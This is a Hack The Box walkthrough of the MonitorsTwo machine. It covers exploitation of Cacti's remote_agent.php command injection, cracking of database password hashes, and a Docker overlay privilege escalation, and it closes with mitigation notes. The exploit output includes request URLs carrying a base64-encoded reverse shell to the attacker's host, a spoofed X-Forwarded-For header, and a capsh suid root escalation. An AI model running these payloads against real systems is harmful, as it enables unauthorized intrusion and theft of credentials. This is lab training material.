---
layout: post
title: Hack The Box Walkthrough - MonitorsTwo
date: 2023-09-02
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2023/09/HTB/MonitorsTwo
img: 2023/09/MonitorsTwo/MonitorsTwo.png
---

In this box, I exploited a know vulnerability in Cacti. I found SSH credentials in a database. And finally I exploited another know vulnerability, this one in Docker, to get root access.

* Room: MonitorsTwo
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/MonitorsTwo](https://app.hackthebox.com/machines/MonitorsTwo)
* Author: [TheCyberGeek](https://app.hackthebox.com/users/114053)

## Enumeration

I started the box by running Rustscan to check for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

Open 10.10.11.211:22
Open 10.10.11.211:80

[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 18:25 EDT

...

Host is up, received syn-ack (0.031s latency).
Scanned at 2023-05-09 18:25:26 EDT for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:25
Completed NSE at 18:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:25
Completed NSE at 18:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:25
Completed NSE at 18:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds
```

Port 22 (SSH) and 80 (HTTP) were open. I scanned UDP ports, but did not find anything.

Next I ran Feroxbuster to look for hidden pages on the website.

```bash
$ feroxbuster -u http://target.htb -o ferox.txt --dont-scan "/doc,/include"

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.5
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb
 🚫  Don't Scan Regex      │ /doc
 🚫  Don't Scan Regex      │ /include
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.5
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      315c http://target.htb/plugins => http://target.htb/plugins/
301      GET        9l       28w      314c http://target.htb/images => http://target.htb/images/
301      GET        9l       28w      315c http://target.htb/install => http://target.htb/install/
301      GET        9l       28w      315c http://target.htb/scripts => http://target.htb/scripts/
301      GET        9l       28w      313c http://target.htb/cache => http://target.htb/cache/
301      GET        9l       28w      311c http://target.htb/lib => http://target.htb/lib/
200      GET      279l     2491w    15171c http://target.htb/LICENSE
301      GET        9l       28w      325c http://target.htb/install/templates => http://target.htb/install/templates/
301      GET        9l       28w      315c http://target.htb/service => http://target.htb/service/
302      GET        0l        0w        0c http://target.htb/logout.php => index.php
200      GET      272l      862w    13844c http://target.htb/index.php
200      GET      272l      862w    13844c http://target.htb/
302      GET        0l        0w        0c http://target.htb/scripts/ => ../index.php
302      GET        0l        0w        0c http://target.htb/install/ => install.php
302      GET        0l        0w        0c http://target.htb/images/ => ../index.php
302      GET        0l        0w        0c http://target.htb/lib/ => ../index.php
302      GET        0l        0w        0c http://target.htb/plugins/ => ../index.php
302      GET        0l        0w        0c http://target.htb/cache/ => ../index.php
200      GET     3624l    36423w   254887c http://target.htb/CHANGELOG
301      GET        9l       28w      316c http://target.htb/resource => http://target.htb/resource/
302      GET        0l        0w        0c http://target.htb/service/ => ../index.php
302      GET        0l        0w        0c http://target.htb/resource/ => ../index.php
301      GET        9l       28w      315c http://target.htb/locales => http://target.htb/locales/
301      GET        9l       28w      324c http://target.htb/install/upgrades => http://target.htb/install/upgrades/
302      GET        0l        0w        0c http://target.htb/locales/ => ../index.php
302      GET        0l        0w        0c http://target.htb/install/upgrades/ => ../../index.php
301      GET        9l       28w      318c http://target.htb/locales/po => http://target.htb/locales/po/
302      GET        0l        0w        0c http://target.htb/locales/po/ => ../index.php
301      GET        9l       28w      315c http://target.htb/formats => http://target.htb/formats/
500      GET        7l       14w      186c http://target.htb/locales/newsearch
302      GET        0l        0w        0c http://target.htb/formats/ => ../index.php
500      GET        7l       14w      186c http://target.htb/lib/loginbox
500      GET        7l       14w      186c http://target.htb/locales/Unused
[##>-----------------] - 4m    236281/1674481 21m     found:33      errors:548
[###>----------------] - 4m    289119/1674481 17m     found:33      errors:593
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_target_htb-1683671755.state ...
[###>----------------] - 4m    289126/1674481 17m     found:33      errors:593
[###>----------------] - 4m     23304/119601  90/s    http://target.htb/
[###>----------------] - 4m     22785/119601  89/s    http://target.htb/plugins/
[###>----------------] - 4m     23306/119601  91/s    http://target.htb/images/
[###>----------------] - 4m     23174/119601  90/s    http://target.htb/scripts/
[###>----------------] - 4m     22872/119601  89/s    http://target.htb/cache/
[###>----------------] - 4m     23016/119601  89/s    http://target.htb/install/
[###>----------------] - 4m     22982/119601  89/s    http://target.htb/lib/
[###>----------------] - 4m     23209/119601  90/s    http://target.htb/install/templates/
[###>----------------] - 4m     22115/119601  86/s    http://target.htb/service/
[###>----------------] - 4m     22143/119601  87/s    http://target.htb/resource/
[###>----------------] - 4m     18699/119601  83/s    http://target.htb/locales/
[###>----------------] - 4m     18698/119601  83/s    http://target.htb/install/upgrades/
[##>-----------------] - 3m     13926/119601  81/s    http://target.htb/locales/po/
[#>------------------] - 2m      9138/119601  78/s    http://target.htb/formats/
```

It found a few things, but almost everything was redirecting to `index.php`.

## Cacti

I looked at the website on port 80.

![Cacti](/assets/images/2023/09/MonitorsTwo/Cacti.png "Cacti")

It was an instance of [Cacti](https://www.cacti.net/), a monitoring tool. I tried a few default credentials, but they were rejected.

I looked for known vulnerabilities in Cacti 1.2.22, and I quickly [found one](https://www.exploit-db.com/exploits/51166). There is a [great explanation](https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf) of the vulnerability. But in short, `remote_agent.php` allows running some commands. But it limits from where it can be called, and you need to find the correct row in the database. It's easy to spoof the calling machine since the script uses user provided headers like `X-Forwarded-For`. And the row id can be brute forced.

I tried hitting the vulnerability in Caido, but I failed. I downloaded the script from ExploitDb and ran it. I was getting timeout errors. I modified the line that sent the request to increase the timeout.

```python
r = self.session.get(url,headers=headers, timeout=15)
```

I ran it again. Each request was taking a long time, and giving me an error. I let it run for an hour without any success.

```bash
$ python 51166.py -u http://10.10.11.211 -p 4444 -i 10.10.14.15
http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[]=1&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuMTUvNDQ0NCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20-
200 - FATAL: You are not authorized to use this service
http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[]=2&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuMTUvNDQ0NCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20-
200 - FATAL: You are not authorized to use this service
http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[]=3&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuMTUvNDQ0NCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20-
200 - FATAL: You are not authorized to use this service
```

While the script was running, I kept trying to get it to work in Caido. I tried using localhost instead of the server address in the header. When I did, I got a different response from the server, and it was fast.

```http
GET /remote_agent.php?action=polldata&local_data_ids[]=1&host_id=1&poller_id=1%3bwget%2010.10.14.15 HTTP/1.1
Host: 10.10.11.211
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: CactiDateTime=Wed May 10 2023 05:41:45 GMT-0400 (Eastern Daylight Saving Time); CactiTimeZone=-240; Cacti=8eefa21c72806c6d94dffcd4a1370d97
X-Forwarded-For: 127.0.0.1
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 11 May 2023 10:11:21 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.4.33
Last-Modified: Thu, 11 May 2023 10:11:21 GMT
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src *; img-src 'self'  data: blob:; style-src 'self' 'unsafe-inline' ; script-src 'self'  'unsafe-inline' ; frame-ancestors 'self'; worker-src 'self' ;
P3P: CP="CAO PSA OUR"
Cache-Control: no-store, no-cache, must-revalidate
Set-Cookie: Cacti=84980f7ea013f7c2222f3de5b305077e; path=/; HttpOnly; SameSite=Strict
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Content-Length: 54

[{"value":"13","rrd_name":"proc","local_data_id":"1"}]
```

I modified the script to use localhost.

```python
headers = {
  'X-Forwarded-For': '127.0.0.1'
}
```

And ran it again.

```bash
$ python 51166.py -u http://10.10.11.211 -p 4444 -i 10.10.14.15
http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[]=1&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuMTUvNDQ0NCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20-
200 - [{"value":"13","rrd_name":"proc","local_data_id":"1"}]
http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[]=2&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuMTUvNDQ0NCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20-
200 - [{"value":"1min:0.00 5min:0.00 10min:0.00","rrd_name":"","local_data_id":"2"}]
http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[]=3&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuMTUvNDQ0NCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20-
200 - [{"value":"0","rrd_name":"users","local_data_id":"3"}]
http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[]=4&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuMTUvNDQ0NCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20-
200 - [{"value":"3053912","rrd_name":"mem_buffers","local_data_id":"4"}]
http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[]=5&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuMTUvNDQ0NCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20-
200 - [{"value":"1048572","rrd_name":"mem_swap","local_data_id":"5"}]
http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[]=6&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuMTUvNDQ0NCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20-
```

It took a second or two, and I got a reverse shell.

```
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.211] 42524
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$
```

## Marcus Credentials

From the name of the machine I was in, and the presence of a `entrypoint.sh` at the root, it was clear I was in a Docker container. I looked for ways to get out. I started by looking at the site configuration files.

```php
www-data@50bca5e748b0:/var/www/html$ cat include/config.php
<?php
/*
 +-------------------------------------------------------------------------+
 | Copyright (C) 2004-2020 The Cacti Group                                 |
 |                                                                         |
 | This program is free software; you can redistribute it and/or           |
 | modify it under the terms of the GNU General Public License             |
 | as published by the Free Software Foundation; either version 2          |
 | of the License, or (at your option) any later version.                  |
 |                                                                         |
 | This program is distributed in the hope that it will be useful,         |
 | but WITHOUT ANY WARRANTY; without even the implied warranty of          |
 | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           |
 | GNU General Public License for more details.                            |
 +-------------------------------------------------------------------------+
 | Cacti: The Complete RRDtool-based Graphing Solution                     |
 +-------------------------------------------------------------------------+
 | This code is designed, written, and maintained by the Cacti Group. See  |
 | about.php and/or the AUTHORS file for specific developer information.   |
 +-------------------------------------------------------------------------+
 | http://www.cacti.net/                                                   |
 +-------------------------------------------------------------------------+
*/

/*
 * Make sure these values reflect your actual database/host/user/password
 */

$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;
...
```

I did not think there would be a MySQL client in the container, but I gave it a try.

```bash
www-data@50bca5e748b0:/var/www/html$ mysql -hdb -uroot -proot
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 302
Server version: 5.7.40 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

I looked at what was in the database, and found the table that contained user's credentials.

```sql
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| cacti              |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.002 sec)

MySQL [(none)]> use cacti;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [cacti]> show tables;
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
| aggregate_graph_templates           |
| aggregate_graph_templates_graph     |
| aggregate_graph_templates_item      |
| aggregate_graphs                    |
| aggregate_graphs_graph_item         |
| aggregate_graphs_items              |
| automation_devices                  |

...

MySQL [cacti]> Select * From user_auth;
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name      | email_address          | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |     0 | Jamie Thompson | admin@monitorstwo.htb  |                      | on              | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   663348655 |
|  3 | guest    | 43e9a4ab75570f5b                                             |     0 | Guest Account  |                        | on                   | on              | on        | on        | on           | 3              |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |           0 |
|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |     0 | Marcus Brune   | marcus@monitorstwo.htb |                      |                 | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  | on     |               0 |        0 |  2135691668 |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
3 rows in set (0.000 sec)
```

I saved the hashed to a text file and used hashcat to crack them.

```bash
$ cat hash.txt
admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C

$ hashcat -a0 -m3200 --username hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2862/5789 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: hash.txt
Time.Started.....: Wed May 10 06:42:40 2023 (2 mins, 15 secs)
Time.Estimated...: Sat May 13 09:30:16 2023 (3 days, 2 hours)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      107 H/s (10.40ms) @ Accel:6 Loops:32 Thr:1 Vec:1
Recovered........: 0/2 (0.00%) Digests (total), 0/2 (0.00%) Digests (new), 0/2 (0.00%) Salts
Progress.........: 14400/28688768 (0.05%)
Rejected.........: 0/14400 (0.00%)
Restore.Point....: 7200/14344384 (0.05%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:640-672
Candidate.Engine.: Device Generator
Candidates.#1....: danika -> beyonce1
Hardware.Mon.#1..: Util: 94%

$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:REDACTED
```

I had marcus' password. I used it to SSH to the server and read the user flag.

```bash
$ ssh marcus@target
The authenticity of host 'target (10.10.11.211)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
marcus@target's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 10 May 2023 10:47:06 AM UTC

  System load:                      0.0
  Usage of /:                       63.1% of 6.73GB
  Memory usage:                     14%
  Swap usage:                       0%
  Processes:                        237
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:4e52


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40

marcus@monitorstwo:~$ cat user.txt
REDACTED
```

## CVEs

Once connected to the server, there was a notification about having mail. I looked at it.

```bash
marcus@monitorstwo:~$ mail

Command 'mail' not found, but can be installed with:

apt install mailutils
Please ask your administrator.

marcus@monitorstwo:~$ cat /var/spool/mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

The email mentioned three CVEs that were discovered. The first one was a kernel exploit, and the kernel of the server looked like it might be vulnerable to it.

```bash
marcus@monitorstwo:~$ cat /proc/version
Linux version 5.4.0-147-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023
```

The second CVE was an XSS in Cacti. This did not look very interesting since I was already on the server.

The third vulnerability, CVE-2021-41091 had to do with Docker. I already knew that Cacti was running in a container, so that looked interesting. And there was a [POC in GitHub](https://github.com/UncleJ4ck/CVE-2021-41091).


### Getting root in Docker

To exploit the vulnerability, I needed to have root access in a container and set the suid bit on bash. I connected back to the Cacti container and look for ways to escalate my privileges.

I could not run anything with `sudo`. But I found an interesting suid file in there.

```bash
www-data@50bca5e748b0:/tmp$ find / -perm /u=s 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

Escalating privileges with [suid on capsh](https://gtfobins.github.io/gtfobins/capsh/) was very easy.

```bash
www-data@50bca5e748b0:/tmp$ capsh --gid=0 --uid=0 --
root@50bca5e748b0:/tmp# chmod u+s /bin/bash
```

### Running the exploit

With bash as suid in the container, I went back to the host, saved the POC to a file and ran it.

```bash
marcus@monitorstwo:~$ chmod +x poc.sh

marcus@monitorstwo:~$ ./poc.sh
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit

marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p

bash-5.1# whoami
root

bash-5.1# cat /root/root.txt
REDACTED
```

## Mitigation

The issues on this machine were mostly outdated applications. Cacti and Docker had known vulnerabilities. If they had been up to date, I would not have been able to gain access, and root.

There was also the password reuse. Marcus should not use the same password to connect to a web application and to the server.

And lastly, why give suid to a random binary?